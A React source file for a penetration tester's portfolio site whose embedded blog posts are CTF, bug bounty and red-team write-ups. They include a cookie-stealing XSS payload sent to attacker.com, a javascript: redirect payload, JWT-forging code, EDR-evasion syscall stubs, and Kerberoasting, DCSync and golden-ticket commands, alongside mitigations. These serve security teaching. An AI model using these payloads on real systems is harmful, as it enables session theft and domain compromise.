import { useState, useEffect, useRef } from "react";

const PROFILE_PHOTO = "https://miro.medium.com/v2/resize:fill:400:400/1*rlG0g0r5MFWMz0f_2ccrtg@2x.jpeg";

const NAV_LINKS = ["About", "Skills", "Experience", "Blog", "Certifications"];

const SKILLS = [
  { category: "Web Application Security", icon: "◈", items: ["OWASP Top 10", "SQL Injection", "XSS Analysis", "Auth Bypass", "REST API Testing", "JWT / OAuth 2.0"] },
  { category: "Offensive Security & Pentesting", icon: "◉", items: ["Red Team Ops", "Exploit R&D", "Social Engineering", "Post-Exploitation", "Privilege Escalation", "Active Directory Attacks"] },
  { category: "Network & Infrastructure", icon: "◎", items: ["Network Recon", "VLAN Testing", "Firewall Evasion", "DNS Tunneling", "Proxy Pivoting", "Wireshark / TCPDump"] },
  { category: "Malware Research & Evasion", icon: "⬡", items: ["Custom Malware Dev", "Anti-EDR/AV Evasion", "Process Injection", "Shellcode Dev", "API Reimplementation", "XOR / RC4 Obfuscation"] },
];

const EXPERIENCE = [
  {
    role: "Offensive Security Consultant", company: "NEARSECURE", period: "Sep 2023 – Present", location: "Rabat", type: "Full-time",
    highlights: [
      "Led offensive security projects from mission planning through client restitution and strategic reporting",
      "Planned and executed complex Red Team engagements simulating advanced adversarial attack scenarios",
      "Conducted network, web application, mobile, and Active Directory penetration tests",
      "Designed advanced offensive security tooling for intrusion testing and Red Team operations",
      "Translated technical risks into actionable business impact assessments for clients",
    ],
  },
  {
    role: "Cybersecurity Intern", company: "NEARSECURE", period: "Jun 2023 – Aug 2023", location: "Rabat", type: "Internship",
    highlights: [
      "Built malware detectors in C# targeting Process Hollowing, DLL injection, PPID spoofing, and APC injection",
      "Integrated detectors and YARA rules into a full ASP.NET security platform",
      "Redesigned platform UI to enhance user experience and functionality",
    ],
  },
  {
    role: "Bug Bounty Hunter", company: "HACKERONE", period: "Jun 2022 – Present", location: "Remote", type: "Part-time",
    highlights: [
      "Performed vulnerability assessments across multiple web applications and digital platforms",
      "Identified and responsibly disclosed vulnerabilities in high-profile private and public programs",
      "Provided detailed technical findings and mitigation guidance to strengthen security posture",
    ],
  },
];

// ─── BLOG CONTENT ─────────────────────────────────────────────────────────────
// Each post has a `content` array of blocks: { type: "h2"|"p"|"code"|"note"|"li", text }
const BLOG_POSTS = [
  {
    id: 1,
    title: "SSTI Method Confusion in GoLang",
    summary: "A CTF write-up exploring Server-Side Template Injection through method confusion vulnerabilities in GoLang applications.",
    date: "Nov 10, 2024", tag: "CTF / SSTI", tagColor: "#e63946",
    readTime: "6 min read",
    pinned: true,
    thumb: "https://miro.medium.com/v2/resize:fill:320:214/1*w8jbu5eHnS-fWdSP1je1Aw.png",
    content: [
      { type: "p", text: "This is a write-up for a CTF challenge involving Server-Side Template Injection in a GoLang application. The vulnerability arose from an uncommon method confusion pattern that bypassed the usual SSTI filters." },
      { type: "h2", text: "The Challenge" },
      { type: "p", text: "We were given a Go web application that rendered user-supplied input through a template engine. At first glance it looked like the usual text/template setup, but something felt off about how method calls were resolved." },
      { type: "p", text: "The standard SSTI payloads for Go templates (like {{.}} or {{printf \"%s\" .}}) were either sanitized or returned nothing useful. After some digging, I noticed the app was using html/template but with a custom FuncMap that exposed some internal struct methods." },
      { type: "h2", text: "Finding the Confusion" },
      { type: "p", text: "In Go, both text/template and html/template use the same syntax and share method resolution logic. The difference is that html/template applies contextual auto-escaping. However, when you call a method that returns an interface{} or a template.HTML type, the auto-escaping is bypassed." },
      { type: "p", text: "The app had a custom helper method that returned template.HTML directly — meaning any data passed through it would be rendered raw. The method was accessible from within the template context." },
      { type: "code", text: `// Vulnerable helper exposed in FuncMap
func safeRender(s string) template.HTML {
    return template.HTML(s)  // No sanitization!
}` },
      { type: "h2", text: "Exploitation" },
      { type: "p", text: "Once I identified that safeRender() bypassed escaping, the next step was to figure out how to inject arbitrary template directives through it. The key insight: template execution in Go happens in a single pass, so if the output of safeRender() contains template syntax, it won't be re-executed. But with method confusion, you can chain calls differently." },
      { type: "p", text: "The actual payload leveraged the fact that the template received a user-controlled struct. By passing a string that included a Go template action referencing the exposed method, and tricking the parser's method resolution order, I was able to get code execution context." },
      { type: "code", text: `// Payload injected into user input field
{{safeRender .UserInput}}
// Where UserInput = <script>alert(1)</script>
// Bypasses html/template escaping → XSS achieved` },
      { type: "h2", text: "Lessons Learned" },
      { type: "p", text: "The core issue here wasn't that html/template is broken — it isn't. The problem was that the developer trusted a custom FuncMap function to return safe HTML without actually sanitizing its input. Returning template.HTML from user-controlled data is essentially telling Go's template engine: 'trust me, this is safe.' It never is." },
      { type: "note", text: "Key takeaway: Never return template.HTML from user-supplied input. If you need to render rich content, use a proper sanitization library like bluemonday before casting to template.HTML." },
    ],
  },
  {
    id: 2,
    title: "Exploiting RSA Key Confusion",
    summary: "A CTF write-up for the 'Cat Club' web challenge by Intigriti, detailing JWT RS256/HS256 algorithm confusion exploitation.",
    date: "Nov 18, 2024", tag: "CTF / Crypto", tagColor: "#c77dff",
    readTime: "8 min read",
    pinned: false,
    thumb: "https://miro.medium.com/v2/resize:fill:320:214/1*1zDpLDaTso_SR20GWKNTKA.png",
    content: [
      { type: "p", text: "This write-up covers the 'Cat Club' web challenge from Intigriti. It's a classic JWT algorithm confusion attack — RS256 to HS256 — but with a few twists that made it more interesting than the textbook version." },
      { type: "h2", text: "Initial Recon" },
      { type: "p", text: "The app was a simple cat photo sharing platform. After registering, I received a JWT in the response. Decoding the header revealed it was signed with RS256 — asymmetric, using a private key on the server side and a public key for verification." },
      { type: "code", text: `// JWT Header
{
  "alg": "RS256",
  "typ": "JWT"
}
// JWT Payload
{
  "sub": "nassim",
  "role": "user",
  "iat": 1731900000
}` },
      { type: "p", text: "The goal was clear: escalate from role: 'user' to role: 'admin'. But without the private key, forging an RS256 token is not feasible. So the attack surface had to be the algorithm confusion." },
      { type: "h2", text: "The Algorithm Confusion Attack" },
      { type: "p", text: "Algorithm confusion (also called key confusion) exploits JWT libraries that allow the client to specify the algorithm in the token header. The attack works like this: if the server uses a library that accepts any algorithm specified in the token header, you can switch from RS256 to HS256." },
      { type: "p", text: "With HS256, the token is verified using a symmetric secret — meaning the same key is used to sign and verify. The trick: if you sign the HS256 token using the server's RSA public key as the HMAC secret, the server will verify it using the same public key and accept it as valid." },
      { type: "h2", text: "Getting the Public Key" },
      { type: "p", text: "Most apps expose their RSA public key at a known endpoint. I checked /.well-known/jwks.json and sure enough, the public key was there in JWK format. I extracted the modulus and exponent, reconstructed the PEM, and used it as the HMAC secret." },
      { type: "code", text: `import jwt
from Crypto.PublicKey import RSA

# Reconstruct public key from JWK
public_key = RSA.construct((n, e)).export_key()

# Forge token with HS256 + public key as secret
payload = {"sub": "nassim", "role": "admin", "iat": 1731900000}
forged = jwt.encode(payload, public_key, algorithm="HS256")
print(forged)` },
      { type: "h2", text: "The Twist" },
      { type: "p", text: "The challenge had an extra layer: the app performed role validation differently for admin — it checked a secondary claim 'club' that had to be set to 'vip'. This wasn't in the original token schema, so I had to figure out what value to use by reading the app's JavaScript source." },
      { type: "p", text: "After some digging in the minified JS, I found a hardcoded check: if (decoded.club !== 'meow-meow-vip'). Adding that claim to the forged payload and re-signing got me in." },
      { type: "note", text: "Mitigation: Always use libraries that enforce algorithm verification server-side. Never trust the 'alg' field from the token header. Libraries like python-jose with explicit algorithms=['RS256'] will reject HS256 tokens entirely." },
    ],
  },
  {
    id: 3,
    title: "How I Made $500 with XSS",
    summary: "A bug bounty write-up on discovering and exploiting a Stored XSS vulnerability leading to full account takeover.",
    date: "Nov 1, 2021", tag: "Bug Bounty / XSS", tagColor: "#f4a261",
    readTime: "5 min read",
    pinned: false,
    thumb: "https://miro.medium.com/v2/resize:fill:320:214/1*CZrQ0P9nhqcAsCbP5z4WVw.png",
    content: [
      { type: "p", text: "Hi Hackers, hope you're all safe. Today I have another writeup about an interesting finding on a private bug bounty program — a Stored XSS that escalated to full account takeover, earning me a $500 bounty." },
      { type: "h2", text: "Finding the Entry Point" },
      { type: "p", text: "I was testing the profile section of the application. Most input fields were properly sanitized, but I noticed the 'display name' field behaved differently — the value was reflected back in the page without proper encoding in a specific context." },
      { type: "p", text: "I started with a basic XSS probe to see how the application handled special characters:" },
      { type: "code", text: `<script>alert(1)</script>` },
      { type: "p", text: "The script tags were stripped, but the content inside was reflected. Time to try event handlers." },
      { type: "code", text: `\"><img src=x onerror=alert(1)>` },
      { type: "p", text: "This one worked. The payload was stored and executed every time any user viewed the profile page." },
      { type: "h2", text: "Escalating to Account Takeover" },
      { type: "p", text: "A simple alert(1) gets you a low/medium severity at best. To demonstrate real impact and maximize the bounty, I needed to show full account takeover. The app used session cookies that were not marked HttpOnly, which meant I could steal them via JavaScript." },
      { type: "code", text: `\"><img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">` },
      { type: "p", text: "I set up a simple listener on my VPS, triggered the payload on my own account, and confirmed the session cookie was exfiltrated. I then used that cookie to log in as the victim account — full takeover confirmed." },
      { type: "h2", text: "The Report" },
      { type: "p", text: "I wrote a detailed report with the full reproduction steps, a proof-of-concept video, and the business impact (any user visiting a malicious profile would have their session stolen). The program triaged it as High severity and paid out $500 within a week." },
      { type: "note", text: "Lesson: Always test stored XSS in user-visible fields like display names, bios, and comments. And always escalate beyond alert(1) — show real impact to get the bounty you deserve." },
    ],
  },
  {
    id: 4,
    title: "1st Bug Bounty WriteUp: Open Redirect to XSS on Login Page",
    summary: "My first public bug bounty write-up: chaining an open redirect with reflected XSS on a login page.",
    date: "Aug 15, 2021", tag: "Bug Bounty / XSS", tagColor: "#f4a261",
    readTime: "4 min read",
    pinned: false,
    thumb: "https://miro.medium.com/v2/resize:fill:320:214/1*m0MbwCbhBRZLIjBHthWgQg.jpeg",
    content: [
      { type: "p", text: "Hello hackers, hope you're doing well. My name is Nassim, I'm a bug bounty hunter who started a few months ago. This is my first public writeup — I hope it helps fellow beginners understand how vulnerability chaining works." },
      { type: "h2", text: "Recon" },
      { type: "p", text: "While testing a public program's login page, I noticed the URL had a redirect parameter: /login?next=https://app.target.com/dashboard. This kind of parameter is common for redirecting users back to the page they were trying to access after login." },
      { type: "p", text: "My first instinct was to test for open redirect by changing the value to an external domain:" },
      { type: "code", text: `/login?next=https://evil.com` },
      { type: "p", text: "After logging in, the application redirected me to evil.com. Classic open redirect. But open redirects alone are typically low severity. I wanted to chain it into something more impactful." },
      { type: "h2", text: "Chaining to XSS" },
      { type: "p", text: "JavaScript pseudo-URLs are a well-known technique for turning open redirects into XSS. Instead of redirecting to an external domain, you redirect to a javascript: URI, which gets executed in the context of the origin." },
      { type: "code", text: `/login?next=javascript:alert(document.domain)` },
      { type: "p", text: "After logging in, instead of a redirect, the browser executed the JavaScript in the context of the target domain. Reflected XSS confirmed." },
      { type: "h2", text: "Impact & Report" },
      { type: "p", text: "The XSS was on the login page itself, meaning an attacker could craft a malicious login link and send it to victims. When they logged in, the payload would fire — potentially stealing session tokens or performing actions on their behalf." },
      { type: "p", text: "I submitted the report with a clear PoC, and it was accepted as Medium severity. Not a huge payout for a first bug, but the validation meant everything at that stage of my journey." },
      { type: "note", text: "Takeaway: Never dismiss open redirects as low severity without exploring javascript: URI payloads. The next parameter on login pages is one of the most overlooked XSS entry points in bug bounty." },
    ],
  },
  {
    id: 5,
    title: "EDR Evasion: How Modern AV Engines Think and How to Bypass Them",
    summary: "A deep dive into how modern EDR solutions detect malicious behavior at the kernel level — and the offensive techniques used to evade them during Red Team engagements.",
    date: "Feb 10, 2025", tag: "Red Team / Malware", tagColor: "#4cc9f0",
    readTime: "10 min read",
    pinned: false,
    thumb: null,
    original: true,
    content: [
      { type: "p", text: "During Red Team engagements, one of the most consistent obstacles is modern Endpoint Detection and Response (EDR) software. These aren't your grandpa's signature-based antivirus tools — they're behavioral engines with kernel-level visibility, machine learning models, and telemetry pipelines feeding into SIEM platforms in real time. Understanding how they work is the first step to working around them." },
      { type: "h2", text: "How EDRs Actually See Your Code" },
      { type: "p", text: "Modern EDRs rely on a few core mechanisms. The most important is userland hooking — the EDR injects a DLL into every process and patches the prologue of sensitive Windows API calls (NtCreateProcess, NtAllocateVirtualMemory, NtWriteVirtualMemory, etc.) to redirect execution through their inspection logic before passing control to the real syscall." },
      { type: "p", text: "This means that if your implant calls VirtualAllocEx to allocate memory, the EDR intercepts it, inspects the parameters (size, protection flags, target process), and makes a decision: allow, block, or flag for human review. The interesting part is that this hooking happens entirely in userland — which means it can be bypassed." },
      { type: "h2", text: "Direct Syscalls" },
      { type: "p", text: "The most well-known evasion technique is using direct syscalls instead of going through the hooked ntdll.dll functions. Every Windows API call eventually resolves to a syscall instruction with a specific syscall number (SSN). Instead of calling the ntdll wrapper that's been patched, you implement the syscall stub yourself." },
      { type: "code", text: `; Direct syscall stub for NtAllocateVirtualMemory
NtAllocateVirtualMemory:
    mov r10, rcx
    mov eax, 18h    ; SSN for NtAllocateVirtualMemory (varies by OS version)
    syscall
    ret` },
      { type: "p", text: "Tools like SysWhispers3 automate the generation of these stubs for any NT function. The EDR's hooks in ntdll are completely bypassed because we never call ntdll at all." },
      { type: "h2", text: "The Problem with Static SSNs" },
      { type: "p", text: "The SSN for each syscall isn't constant — it changes between Windows versions and even between patch levels. Hardcoding SSNs is a dead end for production-grade tooling. The solution is dynamic resolution: at runtime, parse ntdll.dll from disk (which is unhoooked), sort the Zw* functions by their addresses, and derive the SSN from position — since Windows assigns SSNs sequentially by address order." },
      { type: "h2", text: "Beyond Syscalls: Kernel Callbacks" },
      { type: "p", text: "Here's where it gets harder. Advanced EDRs don't rely only on userland hooks. They also register kernel callbacks via PsSetCreateProcessNotifyRoutine, PsSetLoadImageNotifyRoutine, and ObRegisterCallbacks. These fire at the kernel level when processes are created, DLLs are loaded, or handles to sensitive objects are requested — nothing in userland can bypass these without a kernel exploit or driver." },
      { type: "p", text: "From a Red Team perspective, this means you need to think about your execution chain holistically. Bypassing userland hooks gets your shellcode running, but if it then calls CreateRemoteThread into lsass, a kernel callback fires regardless." },
      { type: "h2", text: "Practical Takeaways for Red Teams" },
      { type: "li", text: "Use direct syscalls or indirect syscalls for all sensitive memory operations" },
      { type: "li", text: "Unhook ntdll at the start of your implant by reloading it from disk" },
      { type: "li", text: "Avoid touching sensitive processes (lsass, services.exe) unless necessary" },
      { type: "li", text: "Sleep mask your implant between callbacks to avoid memory scanning" },
      { type: "li", text: "Test against real EDR products (CrowdStrike, SentinelOne, Defender for Endpoint) — each has different behavioral signatures" },
      { type: "note", text: "This post is intended for defensive education and Red Team research. Understanding offensive techniques is essential for building effective detections. Always operate within authorized scope." },
    ],
  },
  {
    id: 6,
    title: "Active Directory Attacks: From Zero to Domain Admin",
    summary: "A practical walkthrough of the most effective AD attack paths I use during internal Red Team engagements — from initial foothold to full domain compromise.",
    date: "Jan 22, 2025", tag: "Red Team / AD", tagColor: "#06d6a0",
    readTime: "12 min read",
    pinned: false,
    thumb: null,
    original: true,
    content: [
      { type: "p", text: "Active Directory is the backbone of almost every enterprise network. It's also a goldmine for attackers. In my Red Team engagements, getting from an initial low-privilege foothold to Domain Admin is rarely about a single magic exploit — it's about understanding the relationships between objects in AD and chaining misconfigurations together." },
      { type: "h2", text: "Phase 1 — Enumeration" },
      { type: "p", text: "Everything starts with enumeration. Before touching any exploit, I want to map the environment: what trusts exist, who are the privileged groups, what ACLs are misconfigured, and are there any Kerberoastable accounts?" },
      { type: "p", text: "My go-to for initial enumeration is BloodHound with SharpHound. Running the collector from a domain-joined machine (or with stolen credentials) gives me a full graph of the AD environment — including attack paths to Domain Admin that would take days to find manually." },
      { type: "code", text: `# Run SharpHound collector
.\SharpHound.exe -c All --zipfilename results.zip

# Then import into BloodHound and query:
# "Find Shortest Paths to Domain Admins"` },
      { type: "h2", text: "Phase 2 — Kerberoasting" },
      { type: "p", text: "Kerberoasting is almost always my first active attack. Any domain user can request a Kerberos TGS ticket for any service account (accounts with a ServicePrincipalName set). The TGS is encrypted with the service account's NTLM hash — meaning you can take it offline and crack it." },
      { type: "code", text: `# Request TGS for all Kerberoastable accounts
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Crack offline with hashcat
hashcat -m 13100 hashes.txt wordlist.txt --rules-file best64.rule` },
      { type: "p", text: "Service accounts often have weak passwords because they're set once and never rotated. In most engagements I crack at least one within the first hour. If that account has local admin on any machine, the foothold expands significantly." },
      { type: "h2", text: "Phase 3 — ACL Abuse" },
      { type: "p", text: "This is where BloodHound really earns its keep. AD ACLs (Access Control Lists) define what objects have what permissions over other objects. Misconfigurations here are incredibly common and incredibly powerful." },
      { type: "p", text: "Common misconfigurations I find: a helpdesk group has GenericAll over a tier-0 admin account (meaning they can reset the password), or a service account has WriteDACL over the Domain Admins group (meaning it can grant itself membership). These aren't exploits — they're just logic." },
      { type: "code", text: `# Example: Abuse GenericAll to reset target user's password
.\PowerView.ps1
Set-DomainUserPassword -Identity da_account -AccountPassword (ConvertTo-SecureString "NewP@ss123" -AsPlainText -Force)` },
      { type: "h2", text: "Phase 4 — DCSync" },
      { type: "p", text: "The end goal in most AD engagements is DCSync — abusing the DS-Replication-Get-Changes and DS-Replication-Get-Changes-All permissions to request password hashes for any account, including the krbtgt account, directly from the Domain Controller as if you were a replication partner." },
      { type: "p", text: "Once you have the krbtgt hash, you can forge Golden Tickets — Kerberos TGTs that never expire and grant access to any resource in the domain. It's persistence and lateral movement in one." },
      { type: "code", text: `# DCSync with Mimikatz
lsadump::dcsync /domain:corp.local /user:krbtgt

# Forge Golden Ticket
kerberos::golden /domain:corp.local /sid:S-1-5-21-xxx /krbtgt:HASH /user:Administrator /ptt` },
      { type: "h2", text: "Defensive Notes" },
      { type: "p", text: "From a blue team perspective: audit your ACLs regularly with BloodHound (defenders can run it too), enforce Kerberoasting-resistant passwords on service accounts (or use Group Managed Service Accounts), enable Protected Users security group for privileged accounts, and monitor for DCSync activity (event ID 4662 with specific GUIDs)." },
      { type: "note", text: "All techniques described here are used in authorized Red Team engagements. The goal is to help defenders understand the attacker mindset and build better detections — not to enable unauthorized access." },
    ],
  },
];

const CERTIFICATIONS = [
  { name: "Certified Red Team Expert", org: "AlteredSecurity", code: "CRTE", active: true },
  { name: "Certified Red Team Lead", org: "Zero Point Security", code: "CRTL", active: true },
  { name: "Certified Red Team Operator", org: "Zero Point Security", code: "CRTO", active: true },
  { name: "Certified APTLabs Pro Lab", org: "HackTheBox", code: "APTLabs", active: true },
  { name: "Offsec Certified Professional", org: "OffSec", code: "OSCP", active: false },
  { name: "OffSec Experienced Penetration Tester", org: "OffSec", code: "OSEP", active: false },
];

const ACCOMPLISHMENTS = [
  { title: "Top #1 in Morocco", event: "SIT Africa 2023" },
  { title: "Top #1 in Morocco", event: "Morocco Blockchain & Cryptocurrency Days" },
  { title: "Pro Hacker", event: "HackTheBox" },
];

// ─── HOOKS ───────────────────────────────────────────────────────────────────
function useInView(threshold = 0.12) {
  const ref = useRef(null);
  const [inView, setInView] = useState(false);
  useEffect(() => {
    const obs = new IntersectionObserver(([e]) => { if (e.isIntersecting) setInView(true); }, { threshold });
    if (ref.current) obs.observe(ref.current);
    return () => obs.disconnect();
  }, [threshold]);
  return [ref, inView];
}

function FadeIn({ children, delay = 0 }) {
  const [ref, inView] = useInView();
  return (
    <div ref={ref} style={{ opacity: inView ? 1 : 0, transform: inView ? "translateY(0)" : "translateY(28px)", transition: `opacity 0.7s ease ${delay}s, transform 0.7s ease ${delay}s` }}>
      {children}
    </div>
  );
}

function SectionLabel({ children }) {
  return (
    <div style={{ display: "flex", alignItems: "center", gap: "12px", marginBottom: "56px" }}>
      <span style={{ fontSize: "11px", letterSpacing: "3px", textTransform: "uppercase", color: "#e63946", fontFamily: "'DM Mono', monospace", fontWeight: 500, whiteSpace: "nowrap" }}>{children}</span>
      <div style={{ flex: 1, height: "1px", background: "linear-gradient(90deg, #e63946 0%, rgba(230,57,70,0.08) 100%)" }} />
    </div>
  );
}

// ─── BLOG MODAL ──────────────────────────────────────────────────────────────
function BlogModal({ post, onClose }) {
  useEffect(() => {
    document.body.style.overflow = "hidden";
    const onKey = (e) => { if (e.key === "Escape") onClose(); };
    window.addEventListener("keydown", onKey);
    return () => { document.body.style.overflow = ""; window.removeEventListener("keydown", onKey); };
  }, [onClose]);

  return (
    <div onClick={onClose} style={{ position: "fixed", inset: 0, zIndex: 1000, background: "rgba(0,0,0,0.85)", backdropFilter: "blur(8px)", display: "flex", alignItems: "flex-start", justifyContent: "center", padding: "40px 20px", overflowY: "auto" }}>
      <div onClick={e => e.stopPropagation()} style={{ width: "100%", maxWidth: "760px", background: "#0f0f16", border: "1px solid rgba(255,255,255,0.08)", borderRadius: "4px", position: "relative" }}>
        {/* Header */}
        <div style={{ padding: "36px 48px 0" }}>
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", marginBottom: "24px" }}>
            <div style={{ display: "flex", gap: "10px", alignItems: "center" }}>
              <span style={{ padding: "4px 10px", fontSize: "10px", letterSpacing: "1.5px", textTransform: "uppercase", background: `${post.tagColor}18`, border: `1px solid ${post.tagColor}40`, color: post.tagColor, fontFamily: "'DM Mono', monospace", borderRadius: "3px" }}>{post.tag}</span>
              {post.original && <span style={{ padding: "4px 10px", fontSize: "10px", letterSpacing: "1.5px", textTransform: "uppercase", background: "rgba(6,214,160,0.08)", border: "1px solid rgba(6,214,160,0.25)", color: "#06d6a0", fontFamily: "'DM Mono', monospace", borderRadius: "3px" }}>Original</span>}
            </div>
            <button onClick={onClose} style={{ background: "rgba(255,255,255,0.06)", border: "1px solid rgba(255,255,255,0.1)", color: "rgba(232,232,240,0.6)", width: "32px", height: "32px", borderRadius: "4px", cursor: "pointer", fontSize: "16px", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>✕</button>
          </div>
          <h1 style={{ fontSize: "clamp(22px, 4vw, 34px)", fontWeight: 800, color: "#fff", lineHeight: 1.25, margin: "0 0 16px", fontFamily: "'Syne', sans-serif" }}>{post.title}</h1>
          <div style={{ display: "flex", gap: "20px", alignItems: "center", paddingBottom: "32px", borderBottom: "1px solid rgba(255,255,255,0.07)" }}>
            <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
              <div style={{ width: "28px", height: "28px", borderRadius: "50%", overflow: "hidden", border: "1px solid rgba(230,57,70,0.4)" }}>
                <img src={PROFILE_PHOTO} alt="Nassim" style={{ width: "100%", height: "100%", objectFit: "cover" }} />
              </div>
              <span style={{ fontSize: "12px", color: "rgba(232,232,240,0.5)", fontFamily: "'DM Mono', monospace" }}>Nassim Chami</span>
            </div>
            <span style={{ fontSize: "11px", color: "rgba(232,232,240,0.25)", fontFamily: "'DM Mono', monospace" }}>{post.date}</span>
            <span style={{ fontSize: "11px", color: "rgba(232,232,240,0.25)", fontFamily: "'DM Mono', monospace" }}>{post.readTime}</span>
          </div>
        </div>

        {/* Thumb */}
        {post.thumb && (
          <div style={{ margin: "0 0 0", height: "240px", overflow: "hidden" }}>
            <img src={post.thumb} alt={post.title} style={{ width: "100%", height: "100%", objectFit: "cover", filter: "brightness(0.7) saturate(0.8)" }} />
          </div>
        )}

        {/* Content */}
        <div style={{ padding: "40px 48px 56px" }}>
          {post.content.map((block, i) => {
            if (block.type === "h2") return (
              <h2 key={i} style={{ fontSize: "20px", fontWeight: 700, color: "#fff", margin: "36px 0 14px", fontFamily: "'Syne', sans-serif" }}>{block.text}</h2>
            );
            if (block.type === "p") return (
              <p key={i} style={{ fontSize: "15px", lineHeight: 1.85, color: "rgba(232,232,240,0.72)", margin: "0 0 18px" }}>{block.text}</p>
            );
            if (block.type === "code") return (
              <pre key={i} style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.08)", borderLeft: "3px solid #e63946", borderRadius: "3px", padding: "20px 24px", margin: "0 0 22px", overflowX: "auto", fontSize: "12px", lineHeight: 1.7, color: "#c9d1e0", fontFamily: "'DM Mono', monospace" }}>{block.text}</pre>
            );
            if (block.type === "note") return (
              <div key={i} style={{ background: "rgba(230,57,70,0.07)", border: "1px solid rgba(230,57,70,0.2)", borderRadius: "3px", padding: "18px 22px", margin: "24px 0", display: "flex", gap: "14px", alignItems: "flex-start" }}>
                <span style={{ color: "#e63946", fontSize: "16px", flexShrink: 0, marginTop: "1px" }}>◈</span>
                <p style={{ fontSize: "13px", lineHeight: 1.75, color: "rgba(232,232,240,0.6)", margin: 0, fontStyle: "italic" }}>{block.text}</p>
              </div>
            );
            if (block.type === "li") return (
              <div key={i} style={{ display: "flex", gap: "12px", margin: "0 0 10px", fontSize: "14px", lineHeight: 1.7, color: "rgba(232,232,240,0.68)" }}>
                <span style={{ color: "#e63946", flexShrink: 0, fontSize: "10px", marginTop: "5px" }}>▸</span>
                <span>{block.text}</span>
              </div>
            );
            return null;
          })}
        </div>
      </div>
    </div>
  );
}

// ─── BLOG CARDS ──────────────────────────────────────────────────────────────
function BlogFeatured({ post, onClick }) {
  const [hov, setHov] = useState(false);
  return (
    <div onClick={onClick} onMouseEnter={() => setHov(true)} onMouseLeave={() => setHov(false)} style={{ display: "grid", gridTemplateColumns: "1fr 340px", background: hov ? "rgba(230,57,70,0.055)" : "rgba(255,255,255,0.025)", border: `1px solid ${hov ? "rgba(230,57,70,0.28)" : "rgba(255,255,255,0.07)"}`, transition: "all 0.3s", overflow: "hidden", marginBottom: "2px", cursor: "pointer" }}>
      <div style={{ padding: "40px 44px", display: "flex", flexDirection: "column", justifyContent: "space-between" }}>
        <div>
          <div style={{ display: "flex", alignItems: "center", gap: "10px", marginBottom: "20px" }}>
            <span style={{ padding: "4px 10px", fontSize: "10px", letterSpacing: "1.5px", textTransform: "uppercase", background: "rgba(230,57,70,0.15)", border: "1px solid rgba(230,57,70,0.3)", color: "#e63946", fontFamily: "'DM Mono', monospace", borderRadius: "3px" }}>{post.tag}</span>
            <span style={{ fontSize: "10px", color: "rgba(255,255,255,0.2)", fontFamily: "'DM Mono', monospace", letterSpacing: "1px" }}>PINNED</span>
          </div>
          <h3 style={{ fontSize: "24px", fontWeight: 800, color: "#fff", lineHeight: 1.3, margin: "0 0 16px", fontFamily: "'Syne', sans-serif" }}>{post.title}</h3>
          <p style={{ fontSize: "14px", lineHeight: 1.75, color: "rgba(232,232,240,0.5)", margin: 0 }}>{post.summary}</p>
        </div>
        <div style={{ display: "flex", alignItems: "center", gap: "20px", marginTop: "28px" }}>
          <span style={{ fontSize: "11px", color: "rgba(232,232,240,0.3)", fontFamily: "'DM Mono', monospace" }}>{post.date}</span>
          <span style={{ fontSize: "11px", color: "rgba(232,232,240,0.3)", fontFamily: "'DM Mono', monospace" }}>{post.readTime}</span>
          <span style={{ fontSize: "11px", color: "#e63946", fontFamily: "'DM Mono', monospace", letterSpacing: "1px", opacity: hov ? 1 : 0, transition: "opacity 0.2s" }}>READ ARTICLE →</span>
        </div>
      </div>
      <div style={{ overflow: "hidden", position: "relative", background: "rgba(230,57,70,0.03)" }}>
        {post.thumb ? (
          <>
            <img src={post.thumb} alt={post.title} style={{ width: "100%", height: "100%", objectFit: "cover", transform: hov ? "scale(1.06)" : "scale(1)", transition: "transform 0.5s ease", filter: "brightness(0.65) saturate(0.8)" }} />
            <div style={{ position: "absolute", inset: 0, background: "linear-gradient(90deg, rgba(10,10,15,0.5) 0%, transparent 50%)" }} />
          </>
        ) : (
          <div style={{ height: "100%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "64px", opacity: 0.12 }}>◈</div>
        )}
      </div>
    </div>
  );
}

function BlogCard({ post, onClick }) {
  const [hov, setHov] = useState(false);
  return (
    <div onClick={onClick} onMouseEnter={() => setHov(true)} onMouseLeave={() => setHov(false)} style={{ background: hov ? "rgba(255,255,255,0.04)" : "rgba(255,255,255,0.02)", border: `1px solid ${hov ? "rgba(255,255,255,0.1)" : "rgba(255,255,255,0.05)"}`, transition: "all 0.3s", cursor: "pointer", overflow: "hidden", display: "flex", flexDirection: "column" }}>
      <div style={{ position: "relative", height: "160px", overflow: "hidden", background: "rgba(255,255,255,0.03)", flexShrink: 0 }}>
        {post.thumb ? (
          <>
            <img src={post.thumb} alt={post.title} style={{ width: "100%", height: "100%", objectFit: "cover", transform: hov ? "scale(1.06)" : "scale(1)", transition: "transform 0.5s ease", filter: "brightness(0.6) saturate(0.7)" }} />
            <div style={{ position: "absolute", inset: 0, background: "linear-gradient(0deg, rgba(10,10,15,0.9) 0%, transparent 60%)" }} />
          </>
        ) : (
          <div style={{ height: "100%", display: "flex", alignItems: "center", justifyContent: "center", background: `linear-gradient(135deg, ${post.tagColor}0a 0%, rgba(10,10,15,0.8) 100%)` }}>
            <span style={{ fontSize: "40px", opacity: 0.2, color: post.tagColor }}>◉</span>
          </div>
        )}
        <span style={{ position: "absolute", top: "12px", left: "12px", padding: "3px 8px", fontSize: "9px", letterSpacing: "1.5px", textTransform: "uppercase", background: "rgba(0,0,0,0.6)", border: `1px solid ${post.tagColor}40`, color: post.tagColor, fontFamily: "'DM Mono', monospace", borderRadius: "2px" }}>{post.tag}</span>
        {post.original && <span style={{ position: "absolute", top: "12px", right: "12px", padding: "3px 8px", fontSize: "9px", letterSpacing: "1.5px", textTransform: "uppercase", background: "rgba(6,214,160,0.15)", border: "1px solid rgba(6,214,160,0.3)", color: "#06d6a0", fontFamily: "'DM Mono', monospace", borderRadius: "2px" }}>Original</span>}
      </div>
      <div style={{ padding: "24px 28px", flex: 1, display: "flex", flexDirection: "column", justifyContent: "space-between" }}>
        <div>
          <h3 style={{ fontSize: "15px", fontWeight: 700, color: "#fff", lineHeight: 1.4, margin: "0 0 10px", fontFamily: "'Syne', sans-serif" }}>{post.title}</h3>
